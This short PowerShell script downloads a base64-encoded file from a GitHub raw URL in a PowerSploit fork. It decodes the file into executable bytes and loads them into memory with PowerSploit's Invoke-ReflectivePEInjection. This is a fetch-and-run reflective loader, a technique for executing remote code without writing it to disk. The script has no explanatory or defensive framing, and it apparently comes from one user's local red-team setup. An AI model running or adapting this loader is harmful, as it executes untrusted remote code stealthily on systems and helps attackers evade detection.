$b64s = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/armysick/PowerSploit/master/CodeExecution/b64.file')
$PEB = [System.Convert]::FromBase64String($b64s)
cd C:\Users\gustavo.pinto\Desktop\PowerSploit\CodeExecution\
Import-Module .\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $PEB